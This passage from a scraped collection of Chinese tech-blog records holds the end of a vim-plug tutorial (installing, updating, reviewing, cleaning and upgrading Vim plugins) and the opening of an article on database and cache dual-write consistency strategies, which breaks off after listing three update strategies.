print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncall plug#begin('~/.vim/plugged')\r\nPlug 'itchyny/lightline.vim'\r\ncall plug#end()\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acd1179416621-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10acd1179416621-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acd1179416621-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10acd1179416621-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acd1179416621-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10acd1179416621-1\"><span class=\"crayon-e\">call </span><span class=\"crayon-v\">plug</span><span class=\"crayon-p\">#begin('~/.vim/plugged')</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10acd1179416621-2\"><span class=\"crayon-i\">Plug</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'itchyny/lightline.vim'</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe10acd1179416621-3\"><span class=\"crayon-e\">call </span><span class=\"crayon-v\">plug</span><span class=\"crayon-p\">#end()</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10acd1179416621-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe10acd1179416621-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在 vim 配置文件中添加上面的行后，通过输入以下命令重新加载：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10acd7006155806\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:source ~/.vimrc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acd7006155806-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10acd7006155806-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10acd7006155806-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">vimrc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10acd7006155806-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，只需重新加载 Vim 编辑器。</p>\n<p>现在，打开 vim 编辑器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10acdb728330449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acdb728330449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10acdb728330449-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10acdb728330449-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10acdb728330449-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>使用以下命令检查状态：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10acde380198785\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugStatus\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acde380198785-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10acde380198785-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acde380198785-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10acde380198785-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugStatus</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10acde380198785-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe10acde380198785-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>然后输入下面的命令，然后按回车键安装之前在配置文件中声明的插件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10ace1806945697\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugInstall\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10ace1806945697-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10ace1806945697-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10ace1806945697-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugInstall</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10ace1806945697-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h4 id=\"toc_4\">更新插件</h4>\n<p>要更新插件，请运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10ace5686801525\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugUpdate\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10ace5686801525-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10ace5686801525-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10ace5686801525-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugUpdate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10ace5686801525-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>更新插件后，按下 <code>d</code> 查看更改。或者，你可以之后输入 <code>:PlugDiff</code>。</p>\n<h4 id=\"toc_5\">审查插件</h4>\n<p>有时，更新的插件可能有新的 bug 或无法正常工作。要解决这个问题，你可以简单地回滚有问题的插件。输入 <code>:PlugDiff</code> 命令，然后按回车键查看上次 <code>:PlugUpdate</code>的更改，并在每个段落上按 <code>X</code> 将每个插件回滚到更新前的前一个状态。</p>\n<h4 id=\"toc_6\">删除插件</h4>\n<p>删除一个插件删除或注释掉你以前在你的 vim 配置文件中添加的 <code>plug</code> 命令。然后，运行 <code>:source ~/.vimrc</code> 或重启 Vim 编辑器。最后，运行以下命令卸载插件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10ace8187681276\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugClean\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10ace8187681276-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10ace8187681276-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10ace8187681276-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugClean</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10ace8187681276-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>该命令将删除 vim 配置文件中所有未声明的插件。</p>\n<h4 id=\"toc_7\">升级 Vim-plug</h4>\n<p>要升级vim-plug本身，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10aceb674255247\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:PlugUpgrade\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10aceb674255247-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10aceb674255247-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10aceb674255247-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">PlugUpgrade</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10aceb674255247-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如你所见，使用 Vim-plug 管理插件并不难。它简化了插件管理。现在去找出你最喜欢的插件并使用 Vim-plug 来安装它们。</p>\n<p>就是这些了。我将很快在这里发布另一个有趣的话题。在此之前，请继续关注我们。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114132\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114132votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114132\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/a1813a88fb7af8cb32f88586ab2caa5f85752176.jpg"},{"url_object_id": "97dd29d801309a1f0316b5b23e4fbb18", "title": ["分布式之数据库和缓存双写一致性方案解析"], "url": "http://blog.jobbole.com/113992/", "create_date": "2018/05/17", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "praise_nums": "1", "comment_nums": 1, "fav_nums": 0, "tags": "IT技术, 分布式, 数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/rjzheng/p/9041659.html\">孤独烟</a>   </div><h2 id=\"引言\">引言</h2>\n<h3 id=\"为什么写这篇文章\">为什么写这篇文章？</h3>\n<p>首先，缓存由于其高并发和高性能的特性，已经在项目中被广泛使用。在读取缓存方面，大家没啥疑问，都是按照下图的流程来进行业务操作。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/efb54ba1306999e884c5f44d35db7380.png\" alt=\"image\"><br>\n但是在更新缓存方面，对于更新完数据库，是更新缓存呢，还是删除缓存。又或者是先删除缓存，再更新数据库，其实大家存在很大的争议。目前没有一篇全面的博客，对这几种方案进行解析。于是博主战战兢兢，顶着被大家喷的风险，写了这篇文章。</p>\n<h3 id=\"文章结构\">文章结构</h3>\n<p>本文由以下三个部分组成<br>\n1、讲解缓存更新策略<br>\n2、对每种策略进行缺点分析<br>\n3、针对缺点给出改进方案</p>\n<h2 id=\"正文\">正文</h2>\n<p>先做一个说明，从理论上来说，给缓存设置过期时间，是保证最终一致性的解决方案。这种方案下，我们可以对存入缓存的数据设置过期时间，所有的写操作以数据库为准，对缓存操作只是尽最大努力即可。也就是说如果数据库写成功，缓存更新失败，那么只要到达过期时间，则后面的读请求自然会从数据库中读取新值然后回填缓存。因此，接下来讨论的思路不依赖于给缓存设置过期时间这个方案。<br>\n在这里，我们讨论<strong>三种</strong>更新策略：</p>\n<ol>\n<li>先更新数据库，再更新缓存</li>\n<li>先删除缓存，再更新数据库</li>\n<li>先更新数据库，再删除缓存</li>\n</ol>\n<p>应该没人问我，为什么没有先更新缓存，再更新数据库这种策略。</p>\n<h3 